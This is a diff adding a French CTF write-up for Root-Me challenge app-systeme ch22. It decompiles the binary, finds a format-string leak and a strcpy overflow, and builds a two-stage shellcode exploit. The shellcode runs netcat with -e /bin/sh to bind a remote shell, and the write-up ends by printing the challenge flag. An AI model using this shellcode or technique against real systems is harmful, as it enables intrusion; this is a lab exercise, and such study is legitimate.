@@ -1,0 +1,223 @@
+Dissection of the main function:
+
+ds:0x804a020 -> begining of env
+
+esp contains:
+0x43c -> allocation of 1084 memory space.
+0x41c -> $esp + 1052 = 0; DWORD
+0x426 -> $esp + 1062 = 1; WORD
+0x428 -> $esp + 1064 = 0; DWORD
+0x18  -> ptr[1024];
+0x420 -> * = 0x418 + 4
+0x42c -> * = 0x418
+0x418 -> 
+
+extern char **environ;		0x804a020
+FILE		*stdin;			0x804a024
+FILE		*stdout;		0x804a040
+char 		**av;			ebp+0xc
+
+
+int main(int ac, char **av)
+{
+	char	*ptr;			esp+0x42c
+	int		j;				esp+0x428
+	short	s = 1;				esp+0x426
+	?						esp+0x424
+	char    *mdr;			esp+0x420
+	int		i = 0;				esp+0x41c
+	char	tab[1024];		esp+0x18
+
+	i = 0;
+	while (environ[i])
+	{
+		memset(environ[i], 0, strlen(environ[i]));
+		i++;
+	}
+	i = 0;
+	while (av[i])
+	{
+		memset(av[i], 0, strlen(av[i]));
+		i++;
+	}
+	while (s == 0)
+	{
+		j = 0;
+		fgets(tab, 1024, stdin);
+		j = 0;
+		while (j < strlen(tab))
+		{
+			if (tab[j] == 'n' || tab[j] == 'N')
+				tab[j] = '0';
+			j++;
+		}
+		ptr = tab;
+		mdr = tab + 4;
+		strcpy(mdr, tab);
+		printf(tab);
+		fflush(stdout);
+		if (*tab != '0')
+		   *tab = 0;
+	}
+}
+
+Voyons ce que le printf nous offre
+$ ./ch22
+AAAA..%p..%p..%p..%p..%p..%p..%p..%p..%p
+AAAA..0xf4383a48..0xe7b8ac20..0x4..0x4..0x7..0x41414141..0x70252e2e..0x70252e2e..0x70252e2e
+
+Avec gdb maintenant on check a quoi correspond les addresses 0xf4383a48 et 0xe7b8ac20
+$ bash | ./ch22
+(gdb) echo b *(main ret)
+(gdb) echo r
+(gdb) echo %p
+(gdb) 0xf4383a48	<-- correspond maintenant a la premiere adresse que lon veut checker
+(gdb) echo n		<-- Le programme se termine lorsque lon met 'n' ou 'N' en debut de phrase et
+	  	   			comme jai mis un breakpoint au moment du ret du main je dois quitter
+					pour voir la memoire.
+(gdb) echo 'x/100x $esp-500'  <-- au moment de quitter on a 'add 0x43c, $esp',
+	  	   		   			  	  donc on retire 500 pour voir ladresse souhaitee.
+0xf438397c:						  0xdfbc3d8b	 0xf4383a49	   0xdfd19001	0x00000001
+0xf438398c:						  0x00000034	 0x00000034	   0x00000140	0xf4383a49
+0xf438399c:						  0xdfd19002	 0x00000004	   0x00000003	0x0016b4d4
+0xf43839ac:						  0xdfd0a000	 0xdfd0ac20	   0x000003ff	0x00000000
+0xf43839bc:						  0xdfbc3e57	 0xdfd0ac20	   0xf4383a48	0x000003ff
+0xf43839cc:						  0x0000000a	 0x00000001	   0x00000000	0x001a7a60
+0xf43839dc:						  0x00000005	 0x00001000	   0x00000001	0x38333466
+0xf43839ec:						  0xdfbccd4e	 0xdfd0ac20	   0xf4383a48	0xdfba2821
+0xf43839fc:						  0xdfd0a000	 0x00000000	   0xdfd0a000	0xdfd0aac0
+0xf4383a0c:						  0xdfbc29fc	 0xdfd0aac0	   0xf4383a48	0xf4383a34
+0xf4383a1c:						  0x00000003	 0x00000002	   0x00000000	0x00000000
+0xf4383a2c:						  0x0804876c	 0xdfd0aac0	   0xf4383a48	0xdfd0ac20
+0xf4383a3c:						  0x00000004	 0x00000004	   0x00000007	0x00000a30 <- !!!!!
+0xf4383a4c:						  0x001a91cc	 0x001a91cc	   0x00000008	0x0000004c
+0xf4383a5c:						  0x00000004	 0x00000004	   0x6474e550	0x0016b4e8
+0xf4383a6c:						  0x0016b4e8	 0x0016b4e8	   0x000074d4	0x000074d4
+0xf4383a7c:						  0x00000004	 0x00000004	   0x6474e551	0x00000000
+0xf4383a8c:						  0x00000000	 0x00000000	   0x00000000	0x00000000
+0xf4383a9c:						  0x00000006	 0x00000010	   0x6474e552	0x001a81cc
+0xf4383aac:						  0xdfd3e000	 0xf4383d28	   0x00000000	0xf4383ae8
+0xf4383abc:						  0xdfd2990c	 0x00000000	   0x00000000	0x00000000
+0xf4383acc:						  0x00000003	 0x00554e47	   0x56ee495a	0xdfb72049
+0xf4383adc:						  0x00000000	 0x00000000	   0xdfd298c0	0xf4383d58
+0xf4383aec:						  0xdfd2bc06	 0xf4383d28	   0x00000000	0x00000000
+0xf4383afc:						  0xdfd3e878	 0x00000000	   0xf4383d24	0xf4383d20
+(gdb) 
+
+
+0xf4383a48 correspond au debut de notre buffer. Ce meme buffer contient 1024 octets SAUF QUE
+a un moment il y a un strcpy de notre buffer vers la fin de notre buffer (strcpy(mdr, tab)).
+Apres moult tests on sait que l'eip est reecrite apres avoir ecrit 48 caracteres. !!
+Donc si on veut lancer notre shellcode il va falloir ecrire: (56 = 48 + longueur 2 adresses = 0x38)
+[48 caracteres] + [l'adresse de notre buffer + 0x38] * 2 + shellcode
+
+ou alors en 2 temps:
+
+[56 caracteres] + shellcode
+---------
+[48 caracteres] + [l'adresse de notre buffer + 0x38] * 2
+
+CA MARCHE !!!!! on retourne bien la ou on veut.
+Le probleme c'est qu'on a que 48 octets pour notre shellcode.
+On va tenter un read(0, buff, 127);
+Qui lui meme va executer un execve("/bin/nc", ["/bin/nc", "-lvvp17771", "-e/bin/sh"], NULL);
+
+$ cat read.s 	-> (read(0, buff, 127))
+section .text
+global _start
+_start:
+	push 0x7f
+	pop edx
+	push esp
+	pop esp
+	xor ebx, ebx
+	push 0x3
+	pop eax
+	int 0x80
+	push ecx
+	ret
+$ nasm -f elf read.s
+$ for i in $(objdump -d read.o -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
+\x6a\x7f\x5a\x54\x5c\x31\xdb\x6a\x03\x58\xcd\x80\x51\xc3
+--------------------------------------------------------
+$ cat sh.s		-> excve("/bin//nc", ["-vp17771", "-le/bin//sh"], NULL);
+global _start
+section .text
+ _start:
+    xor eax, eax
+    xor edx, edx
+    push eax
+    push 0x31373737     ;-vp17771
+    push 0x3170762d
+    mov esi, esp
+
+    push eax
+    push 0x68732f2f     ;-le//bin//sh
+    push 0x6e69622f
+    push 0x2f656c2d
+    mov edi, esp
+
+    push eax
+    push 0x636e2f2f     ;/bin//cc
+    push 0x6e69622f
+    mov ebx, esp
+
+    push edx
+    push esi
+    push edi
+    push ebx
+    mov ecx, esp
+    mov al,11
+    int 0x80
+$ nasm -f elf sh.s
+$ for i in $(objdump -d sh.o -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
+\x31\xc0\x31\xd2\x50\x68\x37\x37\x37\x31\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80
+-----------------------------------------------------------------------------------------------------------------
+$ bash | nc localhost 56522
+app-systeme-ch22@challenge03:/tmp/gb$ echo %p
+app-systeme-ch22@challenge03:/tmp/gb$ 0xfac40d08
+
+app-systeme-ch22@challenge03:/tmp/gb$ python -c 'print "N"+"\x90"*33+"\x6a\x7f\x5a\x54\x5c\x31\xdb\x6a\x03\x58\xcd\x80\x51\xc3"+"\xfa\xc4\x0d\x09"[::-1]*2'
+����������������������������������ZT\1�jX̀Q�
+app-systeme-ch22@challenge03:/tmp/gb$ python -c 'print "\x90"*10+"\x31\xc0\x31\xd2\x50\x68\x37\x37\x37\x31\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80"'
+app-systeme-ch22@challenge03:/tmp/gb$ listening on [any] 17771 ...
+-------------------------------------------------------------------
+Maintenant on ouvre un deuxieme shell, on se connecte sur le rootme challenge ch22
+$ nc localhost 17771
+ls -la
+total 137
+drwxr-xr-x  25 root root  4096 Jun  4 04:16 .
+drwxr-xr-x  25 root root  4096 Jun  4 04:16 ..
+lrwxrwxrwx   1 root root    37 Jun  4 04:16 .bashrc -> /opt/root-me/common-tools/conf/bashrc
+lrwxrwxrwx   1 root root    33 Jun  4 04:16 .gitconfig -> /opt/root-me/tools/conf/gitconfig
+lrwxrwxrwx   1 root root    39 Jun  4 04:16 .screenrc -> /opt/root-me/common-tools/conf/screenrc
+lrwxrwxrwx   1 root root    40 Jun  4 04:16 .tmux.conf -> /opt/root-me/common-tools/conf/tmux.conf
+lrwxrwxrwx   1 root root    36 Jun  4 04:16 .vimrc -> /opt/root-me/common-tools/conf/vimrc
+drwxr-xr-x   2 root root  4096 Mar 17 00:15 bin
+dr-x------   4 root root  1024 Mar 17 00:17 boot
+drwxr-xr-x   4 root root  4096 Sep  3  2015 challenge
+drwxr-xr-x  15 root root  3980 Jun  4 04:16 dev
+drwxr-xr-x 107 root root  4096 Jun  4 04:16 etc
+drwxr-xr-x   2 root root  4096 May  2  2015 home
+lrwxrwxrwx   1 root root    33 May  2  2015 initrd.img -> boot/initrd.img-3.13.0-32-generic
+drwxr-xr-x  22 root root  4096 Mar 17 00:15 lib
+drwxr-xr-x   2 root root  4096 Aug 16  2016 lib32
+drwxr-xr-x   2 root root  4096 Aug 16  2016 lib64
+drwxr-xr-x   2 root root  4096 Aug 16  2016 libx32
+drwx------   2 root root 16384 May  2  2015 lost+found
+drwxr-xr-x   4 root root  4096 May  2  2015 media
+drwxr-xr-x   3 root root  4096 Feb 13  2016 mnt
+drwxr-xr-x   4 root root  4096 May 16  2015 opt
+dr-xr-xr-x 121 root root     0 Jun  4 04:16 proc
+drwx------  21 root root  4096 Jun  3 17:15 root
+drwxr-xr-x  19 root root   760 Jun  4 12:59 run
+drwxr-xr-x   2 root root 12288 Mar 21 21:29 sbin
+drwxr-xr-x   3 root root  4096 Mar 17 22:33 srv
+drwxr-xr-x  12 root root     0 Jun  4 04:16 sys
+drwxrwx-wt   5 root root 36864 Jun  4 13:06 tmp
+drwxr-xr-x  12 root root  4096 May  2  2015 usr
+drwxr-xr-x  13 root root  4096 May  2  2015 var
+lrwxrwxrwx   1 root root    30 May  2  2015 vmlinuz -> boot/vmlinuz-3.13.0-32-generic
+cat challenge/app-systeme/ch22/.passwd
+bbqbtw?gtfomofo!
+
